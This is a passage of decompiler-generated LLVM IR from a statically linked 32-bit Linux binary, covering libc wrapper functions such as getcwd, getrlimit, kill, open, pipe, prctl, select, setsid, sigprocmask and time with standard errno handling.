  %v0_804faf5 = phi i32 [ %v0_804faf5.pre, %dec_label_pc_804fad8.dec_label_pc_804faea_crit_edge ], [ %tmp11, %dec_label_pc_804fad0 ]
  %v0_804faea = phi i32 [ %v1_804fadc, %dec_label_pc_804fad8.dec_label_pc_804faea_crit_edge ], [ %arg1, %dec_label_pc_804fad0 ]
  store i32 %v0_804faea, i32* @ebx, align 4
  %v2_804faf5 = call i32 @getcwd(i32 %v0_804faf5, i32 %tmp12)
  %v0_804faf7 = load i32, i32* @ebx, align 4
  store i32 %v0_804faf7, i32* @edx, align 4
  store i32 %v2_804faf5, i32* @ebx, align 4
  %tmp18 = icmp ult i32 %v2_804faf5, -4095
  br i1 %tmp18, label %dec_label_pc_804fb0d, label %dec_label_pc_804fb02

dec_label_pc_804fb02:                             ; preds = %dec_label_pc_804faea
  %v0_804fb02 = load i32, i32* %stack_var_-44, align 4
  %v1_804fb02 = call i32 @__errno_location(i32 %v0_804fb02)
  %v0_804fb07 = load i32, i32* @ebx, align 4
  %v1_804fb07 = sub i32 0, %v0_804fb07
  store i32 %v1_804fb07, i32* @ebx, align 4
  %v2_804fb09 = inttoptr i32 %v1_804fb02 to i32*
  store i32 %v1_804fb07, i32* %v2_804fb09, align 4
  br label %dec_label_pc_804fb2f

dec_label_pc_804fb0d:                             ; preds = %dec_label_pc_804faea
  %v2_804fb0d = icmp slt i32 %v2_804faf5, 0
  br i1 %v2_804fb0d, label %dec_label_pc_804fb2f, label %dec_label_pc_804fb11

dec_label_pc_804fb11:                             ; preds = %dec_label_pc_804fb0d
  %v0_804fb11 = load i32, i32* @edi, align 4
  %v1_804fb11 = icmp eq i32 %v0_804fb11, 0
  %v1_804fb13 = icmp eq i1 %v1_804fb11, false
  br i1 %v1_804fb13, label %dec_label_pc_804fb43, label %dec_label_pc_804fb15

dec_label_pc_804fb15:                             ; preds = %dec_label_pc_804fb11
  br i1 %v1_804faa5, label %dec_label_pc_804fb2b, label %dec_label_pc_804fb19

dec_label_pc_804fb19:                             ; preds = %dec_label_pc_804fb15
  %v0_804fb1c = load i32, i32* @esi, align 4
  store i32 %v0_804fb1c, i32* %stack_var_-44, align 4
  %v4_804fb1d = inttoptr i32 %v0_804fb1c to i32*
  %v5_804fb1d = call i32 @realloc(i32* %v4_804fb1d, i32 %v2_804faf5, i32 %v0_804faf7, i32 %v0_804faf7)
  %v1_804fb27 = icmp eq i32 %v5_804fb1d, 0
  %v1_804fb29 = icmp eq i1 %v1_804fb27, false
  br i1 %v1_804fb29, label %dec_label_pc_804fb43, label %dec_label_pc_804fb2b

dec_label_pc_804fb2b:                             ; preds = %dec_label_pc_804fb19, %dec_label_pc_804fb15
  %v0_804fb2b = load i32, i32* @esi, align 4
  br label %dec_label_pc_804fb43

dec_label_pc_804fb2f:                             ; preds = %dec_label_pc_804fb0d, %dec_label_pc_804fb02
  %v0_804fb2f = load i32, i32* @edi, align 4
  %v1_804fb2f = icmp eq i32 %v0_804fb2f, 0
  %v1_804fb31 = icmp eq i1 %v1_804fb2f, false
  br i1 %v1_804fb31, label %dec_label_pc_804fb41, label %dec_label_pc_804fb33

dec_label_pc_804fb33:                             ; preds = %dec_label_pc_804fb2f
  %v0_804fb36 = load i32, i32* @esi, align 4
  store i32 %v0_804fb36, i32* %stack_var_-44, align 4
  %v1_804fb37 = call i32 @free(i32 %v0_804fb36)
  %v0_804fb46.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804fb43

dec_label_pc_804fb41:                             ; preds = %dec_label_pc_804fb2f, %dec_label_pc_804fad8, %dec_label_pc_804faab
  br label %dec_label_pc_804fb43

dec_label_pc_804fb43:                             ; preds = %dec_label_pc_804fb19, %dec_label_pc_804fb11, %dec_label_pc_804fb33, %dec_label_pc_804fb2b, %dec_label_pc_804fb41
  %v0_804fb46 = phi i32 [ %v5_804fb1d, %dec_label_pc_804fb19 ], [ %v0_804fb11, %dec_label_pc_804fb11 ], [ %v0_804fb46.pre, %dec_label_pc_804fb33 ], [ %v0_804fb2b, %dec_label_pc_804fb2b ], [ 0, %dec_label_pc_804fb41 ]
  store i32 %v0_804fa97, i32* @ebx, align 4
  store i32 %v0_804fa96, i32* @esi, align 4
  store i32 %v0_804fa95, i32* @edi, align 4
  store i32 %v0_804fa94, i32* @ebp, align 4
  ret i32 %v0_804fb46

; uselistorder directives
  uselistorder i32 %v2_804faf5, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804fadc, { 0, 2, 1 }
  uselistorder i32 %v0_804fadb, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 3, 4, 2, 0, 5, 1 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder i32 %arg1, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_804fb43, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804fad8, { 1, 2, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804fb53 = ptrtoint i32* %stack_var_-8 to i32
  %v2_804fb5a = call i32 @getrlimit(i32 7, i32 %v2_804fb53)
  store i32 256, i32* @edx, align 4
  %v2_804fb67 = icmp slt i32 %v2_804fb5a, 0
  br i1 %v2_804fb67, label %dec_label_pc_804fb6f, label %dec_label_pc_804fb6b

dec_label_pc_804fb6b:                             ; preds = %entry
  %v3_804fb6b = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804fb6b, i32* @edx, align 4
  br label %dec_label_pc_804fb6f

dec_label_pc_804fb6f:                             ; preds = %entry, %dec_label_pc_804fb6b
  %v0_804fb6f = phi i32 [ 256, %entry ], [ %v3_804fb6b, %dec_label_pc_804fb6b ]
  ret i32 %v0_804fb6f

; uselistorder directives
  uselistorder label %dec_label_pc_804fb6f, { 1, 0 }
}

define i32 @__GI_getpagesize(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804fb78 = load i32, i32* @global_var_80677d0.694, align 16
  %v1_804fb82 = icmp eq i32 %v0_804fb78, 0
  br i1 %v1_804fb82, label %dec_label_pc_804fb88, label %dec_label_pc_804fb86

dec_label_pc_804fb86:                             ; preds = %entry
  br label %dec_label_pc_804fb88

dec_label_pc_804fb88:                             ; preds = %entry, %dec_label_pc_804fb86
  %storemerge = phi i32 [ %v0_804fb78, %dec_label_pc_804fb86 ], [ 4096, %entry ]
  %v0_804fb88 = phi i32 [ %v0_804fb78, %dec_label_pc_804fb86 ], [ 4096, %entry ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_804fb88

; uselistorder directives
  uselistorder label %dec_label_pc_804fb88, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fb8c = load i32, i32* @ebx, align 4
  store i32 %v0_804fb8c, i32* %stack_var_-4, align 4
  %v1_804fb95 = call i32 @getpid(i32 %v0_804fb8c)
  store i32 %v1_804fb95, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804fb95, -4095
  br i1 %tmp6, label %dec_label_pc_804fbac, label %dec_label_pc_804fba0

dec_label_pc_804fba0:                             ; preds = %entry
  %v0_804fba0 = load i32, i32* %stack_var_-4, align 4
  %v1_804fba0 = call i32 @__errno_location(i32 %v0_804fba0)
  %v0_804fba5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fba5 = sub i32 0, %v0_804fba5
  %v2_804fba7 = inttoptr i32 %v1_804fba0 to i32*
  store i32 %v1_804fba5, i32* %v2_804fba7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fbac

dec_label_pc_804fbac:                             ; preds = %entry, %dec_label_pc_804fba0
  %v0_804fbac = phi i32 [ %v1_804fb95, %entry ], [ -1, %dec_label_pc_804fba0 ]
  %v2_804fbb0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fbb0, i32* @ebx, align 4
  ret i32 %v0_804fbac

; uselistorder directives
  uselistorder i32 %v1_804fb95, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fbac, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fbb4 = load i32, i32* @ebx, align 4
  store i32 %v0_804fbb4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804fbc7 = call i32 @int80_syscall(i32 191)
  store i32 %v1_804fbc7, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804fbc7, -4095
  br i1 %tmp8, label %dec_label_pc_804fbe0, label %dec_label_pc_804fbd4

dec_label_pc_804fbd4:                             ; preds = %entry
  %v0_804fbd4 = load i32, i32* %stack_var_-4, align 4
  %v1_804fbd4 = call i32 @__errno_location(i32 %v0_804fbd4)
  %v0_804fbd9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fbd9 = sub i32 0, %v0_804fbd9
  %v2_804fbdb = inttoptr i32 %v1_804fbd4 to i32*
  store i32 %v1_804fbd9, i32* %v2_804fbdb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fbe0

dec_label_pc_804fbe0:                             ; preds = %entry, %dec_label_pc_804fbd4
  %v0_804fbe0 = phi i32 [ %v1_804fbc7, %entry ], [ -1, %dec_label_pc_804fbd4 ]
  %v2_804fbe4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fbe4, i32* @ebx, align 4
  ret i32 %v0_804fbe0

; uselistorder directives
  uselistorder i32 %v1_804fbc7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fbe0, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804fbe8 = load i32, i32* @edi, align 4
  store i32 %v0_804fbe8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804fc00 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804fc08 = call i32 @ioctl(i32 %v0_804fc00, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804fc00, i32* @ebx, align 4
  store i32 %v3_804fc08, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v3_804fc08, -4095
  br i1 %tmp11, label %dec_label_pc_804fc20, label %dec_label_pc_804fc14

dec_label_pc_804fc14:                             ; preds = %entry
  %v1_804fc14 = call i32 @__errno_location(i32 %v0_804fc00)
  %v0_804fc19 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fc19 = sub i32 0, %v0_804fc19
  %v2_804fc1b = inttoptr i32 %v1_804fc14 to i32*
  store i32 %v1_804fc19, i32* %v2_804fc1b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fc20

dec_label_pc_804fc20:                             ; preds = %entry, %dec_label_pc_804fc14
  %v0_804fc20 = phi i32 [ %v3_804fc08, %entry ], [ -1, %dec_label_pc_804fc14 ]
  %v2_804fc25 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fc25, i32* @edi, align 4
  ret i32 %v0_804fc20

; uselistorder directives
  uselistorder i32 %v3_804fc08, { 1, 0, 2 }
  uselistorder i32 %v0_804fc00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fc20, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fc28 = load i32, i32* @ebx, align 4
  store i32 %v0_804fc28, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804fc3b = call i32 @kill(i32 %v0_804fc28, i32 %tmp4)
  store i32 %v2_804fc3b, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804fc3b, -4095
  br i1 %tmp8, label %dec_label_pc_804fc54, label %dec_label_pc_804fc48

dec_label_pc_804fc48:                             ; preds = %entry
  %v0_804fc48 = load i32, i32* %stack_var_-4, align 4
  %v1_804fc48 = call i32 @__errno_location(i32 %v0_804fc48)
  %v0_804fc4d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fc4d = sub i32 0, %v0_804fc4d
  %v2_804fc4f = inttoptr i32 %v1_804fc48 to i32*
  store i32 %v1_804fc4d, i32* %v2_804fc4f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fc54

dec_label_pc_804fc54:                             ; preds = %entry, %dec_label_pc_804fc48
  %v0_804fc54 = phi i32 [ %v2_804fc3b, %entry ], [ -1, %dec_label_pc_804fc48 ]
  %v2_804fc56 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fc56, i32* @edx, align 4
  %v2_804fc58 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fc58, i32* @ebx, align 4
  ret i32 %v0_804fc54

; uselistorder directives
  uselistorder i32 %v2_804fc3b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fc54, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_804fc5d = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804fc63 = sdiv i32 %sext, 16777216
  store i32 %v4_804fc63, i32* @ecx, align 4
  %v4_804fc67 = ptrtoint i8* %arg1 to i32
  %v3_804fc6b = and i32 %arg2, 64
  %v4_804fc6b = icmp eq i32 %v3_804fc6b, 0
  br i1 %v4_804fc6b, label %dec_label_pc_804fc7c, label %dec_label_pc_804fc70

dec_label_pc_804fc70:                             ; preds = %entry
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_804fc7c

dec_label_pc_804fc7c:                             ; preds = %entry, %dec_label_pc_804fc70
  %v0_804fc7c = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_804fc70 ]
  store i32 %v0_804fc7c, i32* @edx, align 4
  store i32 %v4_804fc67, i32* %ebx.global-to-local, align 4
  %v5_804fc87 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804fc63)
  store i32 %v5_804fc87, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_804fc87, -4095
  br i1 %tmp15, label %dec_label_pc_804fc9f, label %dec_label_pc_804fc93

dec_label_pc_804fc93:                             ; preds = %dec_label_pc_804fc7c
  %v1_804fc93 = call i32 @__errno_location(i32 %v0_804fc5d)
  %v0_804fc98 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fc98 = sub i32 0, %v0_804fc98
  %v2_804fc9a = inttoptr i32 %v1_804fc93 to i32*
  store i32 %v1_804fc98, i32* %v2_804fc9a, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fc9f

dec_label_pc_804fc9f:                             ; preds = %dec_label_pc_804fc7c, %dec_label_pc_804fc93
  %v0_804fc9f = phi i32 [ %v5_804fc87, %dec_label_pc_804fc7c ], [ -1, %dec_label_pc_804fc93 ]
  store i32 %v0_804fc5d, i32* @ebx, align 4
  ret i32 %v0_804fc9f

; uselistorder directives
  uselistorder i32 %v5_804fc87, { 1, 0, 2 }
  uselistorder i32 %v4_804fc63, { 1, 0 }
  uselistorder i32 %v0_804fc5d, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804fc9f, { 1, 0 }
  uselistorder label %dec_label_pc_804fc7c, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804fcb7 = inttoptr i32 %arg1 to i8*
  %v4_804fcb7 = call i32 @__libc_open(i8* %v3_804fcb7, i32 577)
  ret i32 %v4_804fcb7
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fcc0 = load i32, i32* @edi, align 4
  store i32 %v0_804fcc0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fcc8 = load i32, i32* @ebx, align 4
  %v1_804fcd0 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_804fcd0 = call i32 @pipe([2 x i32] %v1_804fcd0)
  store i32 %v0_804fcc8, i32* @ebx, align 4
  store i32 %v2_804fcd0, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804fcd0, -4095
  br i1 %tmp8, label %dec_label_pc_804fce8, label %dec_label_pc_804fcdc

dec_label_pc_804fcdc:                             ; preds = %entry
  %v1_804fcdc = call i32 @__errno_location(i32 %v0_804fcc8)
  %v0_804fce1 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fce1 = sub i32 0, %v0_804fce1
  %v2_804fce3 = inttoptr i32 %v1_804fcdc to i32*
  store i32 %v1_804fce1, i32* %v2_804fce3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fce8

dec_label_pc_804fce8:                             ; preds = %entry, %dec_label_pc_804fcdc
  %v0_804fce8 = phi i32 [ %v2_804fcd0, %entry ], [ -1, %dec_label_pc_804fcdc ]
  %v2_804fcec = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fcec, i32* @edi, align 4
  ret i32 %v0_804fce8

; uselistorder directives
  uselistorder i32 %v2_804fcd0, { 1, 0, 2 }
  uselistorder i32 %v0_804fcc8, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fce8, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804fcf0 = load i32, i32* @edi, align 4
  %v0_804fcf1 = load i32, i32* @esi, align 4
  store i32 %v0_804fcf1, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_804fd09 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v5_804fd11 = call i32 @prctl(i32 %v0_804fd09, i32 %v0_804fcf1, i32 %v0_804fcf0, i32 %tmp6, i32 %arg1)
  store i32 %v0_804fd09, i32* @ebx, align 4
  store i32 %v5_804fd11, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v5_804fd11, -4095
  br i1 %tmp11, label %dec_label_pc_804fd29, label %dec_label_pc_804fd1d

dec_label_pc_804fd1d:                             ; preds = %entry
  %v1_804fd1d = call i32 @__errno_location(i32 %v0_804fd09)
  %v0_804fd22 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fd22 = sub i32 0, %v0_804fd22
  %v2_804fd24 = inttoptr i32 %v1_804fd1d to i32*
  store i32 %v1_804fd22, i32* %v2_804fd24, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fd29

dec_label_pc_804fd29:                             ; preds = %entry, %dec_label_pc_804fd1d
  %v0_804fd29 = phi i32 [ %v5_804fd11, %entry ], [ -1, %dec_label_pc_804fd1d ]
  %v2_804fd2c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804fd2c, i32* @esi, align 4
  store i32 %v0_804fcf0, i32* @edi, align 4
  ret i32 %v0_804fd29

; uselistorder directives
  uselistorder i32 %v5_804fd11, { 1, 0, 2 }
  uselistorder i32 %v0_804fd09, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @prctl, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fd29, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fd30 = load i32, i32* @edi, align 4
  store i32 %v0_804fd30, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fd40 = load i32, i32* @ebx, align 4
  %v4_804fd48 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804fd40, i32* @ebx, align 4
  store i32 %v4_804fd48, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_804fd48, -4095
  br i1 %tmp11, label %dec_label_pc_804fd60, label %dec_label_pc_804fd54

dec_label_pc_804fd54:                             ; preds = %entry
  %v1_804fd54 = call i32 @__errno_location(i32 %v0_804fd40)
  %v0_804fd59 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fd59 = sub i32 0, %v0_804fd59
  %v2_804fd5b = inttoptr i32 %v1_804fd54 to i32*
  store i32 %v1_804fd59, i32* %v2_804fd5b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fd60

dec_label_pc_804fd60:                             ; preds = %entry, %dec_label_pc_804fd54
  %v0_804fd60 = phi i32 [ %v4_804fd48, %entry ], [ -1, %dec_label_pc_804fd54 ]
  %v2_804fd64 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fd64, i32* @edi, align 4
  ret i32 %v0_804fd60

; uselistorder directives
  uselistorder i32 %v4_804fd48, { 1, 0, 2 }
  uselistorder i32 %v0_804fd40, { 1, 0 }
  uselistorder label %dec_label_pc_804fd60, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804fd69 = load i32, i32* @esi, align 4
  store i32 %v0_804fd69, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804fd81 = load i32, i32* @ebx, align 4
  %v1_804fd89 = call i32 @int80_syscall(i32 142)
  store i32 %v0_804fd81, i32* @ebx, align 4
  store i32 %v1_804fd89, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_804fd89, -4095
  br i1 %tmp11, label %dec_label_pc_804fda1, label %dec_label_pc_804fd95

dec_label_pc_804fd95:                             ; preds = %entry
  %v1_804fd95 = call i32 @__errno_location(i32 %v0_804fd81)
  %v0_804fd9a = load i32, i32* %esi.global-to-local, align 4
  %v1_804fd9a = sub i32 0, %v0_804fd9a
  %v2_804fd9c = inttoptr i32 %v1_804fd95 to i32*
  store i32 %v1_804fd9a, i32* %v2_804fd9c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fda1

dec_label_pc_804fda1:                             ; preds = %entry, %dec_label_pc_804fd95
  %v0_804fda1 = phi i32 [ %v1_804fd89, %entry ], [ -1, %dec_label_pc_804fd95 ]
  %v2_804fda3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fda3, i32* @edx, align 4
  %v2_804fda4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804fda4, i32* @esi, align 4
  ret i32 %v0_804fda1

; uselistorder directives
  uselistorder i32 %v1_804fd89, { 1, 0, 2 }
  uselistorder i32 %v0_804fd81, { 1, 0 }
  uselistorder label %dec_label_pc_804fda1, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fda8 = load i32, i32* @ebx, align 4
  store i32 %v0_804fda8, i32* %stack_var_-4, align 4
  %v1_804fdb1 = call i32 @setsid(i32 %v0_804fda8)
  store i32 %v1_804fdb1, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804fdb1, -4095
  br i1 %tmp6, label %dec_label_pc_804fdc8, label %dec_label_pc_804fdbc

dec_label_pc_804fdbc:                             ; preds = %entry
  %v0_804fdbc = load i32, i32* %stack_var_-4, align 4
  %v1_804fdbc = call i32 @__errno_location(i32 %v0_804fdbc)
  %v0_804fdc1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fdc1 = sub i32 0, %v0_804fdc1
  %v2_804fdc3 = inttoptr i32 %v1_804fdbc to i32*
  store i32 %v1_804fdc1, i32* %v2_804fdc3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fdc8

dec_label_pc_804fdc8:                             ; preds = %entry, %dec_label_pc_804fdbc
  %v0_804fdc8 = phi i32 [ %v1_804fdb1, %entry ], [ -1, %dec_label_pc_804fdbc ]
  %v2_804fdcc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fdcc, i32* @ebx, align 4
  ret i32 %v0_804fdc8

; uselistorder directives
  uselistorder i32 %v1_804fdb1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fdc8, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804fdd1 = load i32, i32* @esi, align 4
  %v4_804fdd5 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804fdd5, i32* @ecx, align 4
  %v2_804fde1 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804fde1, label %dec_label_pc_804fdfa, label %dec_label_pc_804fde5

dec_label_pc_804fde5:                             ; preds = %entry
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_804fdfa, label %dec_label_pc_804fdea

dec_label_pc_804fdea:                             ; preds = %dec_label_pc_804fde5
  %v1_804fdea = call i32 @__errno_location(i32 %v0_804fdd1)
  %v1_804fdef = inttoptr i32 %v1_804fdea to i32*
  store i32 22, i32* %v1_804fdef, align 4
  br label %dec_label_pc_804fe21

dec_label_pc_804fdfa:                             ; preds = %dec_label_pc_804fde5, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804fdff = load i32, i32* @ebx, align 4
  %v7_804fe07 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp4)
  store i32 %v0_804fdff, i32* @ebx, align 4
  store i32 %v7_804fe07, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_804fe07, -4095
  br i1 %tmp13, label %dec_label_pc_804fe21, label %dec_label_pc_804fe13

dec_label_pc_804fe13:                             ; preds = %dec_label_pc_804fdfa
  %v1_804fe13 = call i32 @__errno_location(i32 %v0_804fdff)
  %v0_804fe18 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fe18 = sub i32 0, %v0_804fe18
  %v2_804fe1a = inttoptr i32 %v1_804fe13 to i32*
  store i32 %v1_804fe18, i32* %v2_804fe1a, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fe21

dec_label_pc_804fe21:                             ; preds = %dec_label_pc_804fe13, %dec_label_pc_804fdfa, %dec_label_pc_804fdea
  %storemerge = phi i32 [ -1, %dec_label_pc_804fdea ], [ %v7_804fe07, %dec_label_pc_804fdfa ], [ -1, %dec_label_pc_804fe13 ]
  %v2_804fe21 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fe21, i32* @edx, align 4
  store i32 %v0_804fdd1, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804fe07, { 1, 0, 2 }
  uselistorder i32 %v0_804fdff, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fe28 = load i32, i32* @edi, align 4
  store i32 %v0_804fe28, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_804fe30 = load i32, i32* @ebx, align 4
  %v2_804fe38 = call i32 @time(i32* %arg1)
  store i32 %v0_804fe30, i32* @ebx, align 4
  store i32 %v2_804fe38, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_804fe38, -4095
  br i1 %tmp9, label %dec_label_pc_804fe50, label %dec_label_pc_804fe44

dec_label_pc_804fe44:                             ; preds = %entry
  %v1_804fe44 = call i32 @__errno_location(i32 %v0_804fe30)
  %v0_804fe49 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fe49 = sub i32 0, %v0_804fe49
  %v2_804fe4b = inttoptr i32 %v1_804fe44 to i32*
  store i32 %v1_804fe49, i32* %v2_804fe4b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fe50

dec_label_pc_804fe50:                             ; preds = %entry, %dec_label_pc_804fe44
